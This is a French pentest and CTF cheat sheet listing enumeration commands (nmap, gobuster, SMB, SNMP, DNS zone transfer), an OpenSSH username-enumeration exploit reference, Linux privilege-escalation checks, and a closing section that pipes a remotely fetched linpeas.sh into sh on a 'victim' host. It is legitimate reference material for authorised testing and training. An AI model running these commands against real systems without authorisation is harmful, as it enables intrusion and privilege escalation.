# Pentest-Cheat-sheet
Cheat sheet pour pentest et CTF

Les mots commençant par un "$" doivent être changé

## Enumeration

### DNS
```bash
dnsenum domain.com
```
#### Transfert de zone
```bash
dig NS domain.com
```

```bash
dig AXFR domain.com @sub.domain.com
```

#### Bruteforce
```bash
gobuster -m dns -u domain.com -w list-subdomains.txt
```
#### DNS Reverse lookup : Retourne le nom des IP données
```bash
nmap -sU -p53 --open $rangeIP
```
```bash
nmap -sn -iL hosts.txt --dns-server $DnsServerIP
```

### NMAP : Scan de ports
#### Scan des top ports TCP
```bash
nmap -sT -Pn -vvv --top-ports 300 -sV $IP
```
#### Scan de tous les ports TCP
```bash
nmap -sS -Pn -vvv -p- -sC -sV --version-all -O --osscan-guess -T3 $IP
```
#### Scan des tops port UDP
```bash
nmap -sU -Pn -vvv --top-ports 100 -sV --version-all -T3 $IP
```

### SMB

#### Information sur l'os et la version utilisé d'une machine windows
```bash
nmap -p139,445 --script=smb-os-discovery $IP
```
#### Information sur les sessions, les partages, les services...
```bash
nmap -p139,445 --script "smb-enum-*" $IP
```
#### Énumère les vulnérabilités SMB
```bash
nmap -p139,445 --script "smb-vuln-*" $IP
```
#### Enumération des répertoires partagés accessibles en anonymous
```bash
smbclient --list //$IP/ -U "
```
### NFS

```bash
nmap -Pn -sV -vvv p111 --script=rpcinfo -iL hosts.txt
```
```bash
nmap -p111 --script "nfs-*" $IP
```
### SNMP
#### Liste les machines qui ont le port SNMP d'ouvert
```bash
nmap -sU -Pn -p161 -sV --open -iL hosts.txt
```
#### Liste tous les utilisateurs
```bash
snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25
```
### SSH
#### CVE-2018-15473 quand OpenSSH <7.7 - Username Enumeration
https://www.exploit-db.com/exploits/45233

https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py
```bash
python3 openssh_userenum.py -w usr.txt $IP
```
### Scan SSL/TLS
#### https://testssl.sh/2.9.5/testssl.sh
```bash
./testssl.sh $URL
```

### WAF
#### Détection d'un waf
```bash
wafw00f $URL
```
### Nikto
```bash
nikto -h $URL -p 80,443
```

### Gobuster
```bash
gobuster –url $IP dir –wordlist /usr/share/wordlists/dirb/big.txt -x php,txt,html,htm
```
#### Sans vérification SSL
```bash
gobuster –url $IP dir –wordlist /usr/share/wordlists/dirb/big.txt -x php,txt,html,htm -k
```


## Exploitation & Privesc (Linux)

### Obtenir un meilleur shell ( plus complet)
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
Faire ctr+z
#### Puis faire cette commande
```bash
stty raw -echo;fg
```
#### Autre shell plus complet
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Commandes à tester

#### Liste les commandes autorisées pour l’utilisateur courant
```bash
sudo -l
```
#### Liste les répertoires accessibles en écriture
```bash
find / -type d -writable 2> /dev/null
```
#### Liste les fichiers setuid/setgid sur le système
Puis voir sur https://gtfobins.github.io
```bash
find / -type f -perm /6000 -ls 2>/dev/null
```
#### Liste les binaires exécutables par l’utilisateur courant
```bash
find /* -user root -perm -4000 -print 2>/dev/null
```

 
### Script Automatique : Linpeas
### Acces internet :
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
### Depuis le réseau local :
```bash
sudo python -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim
```
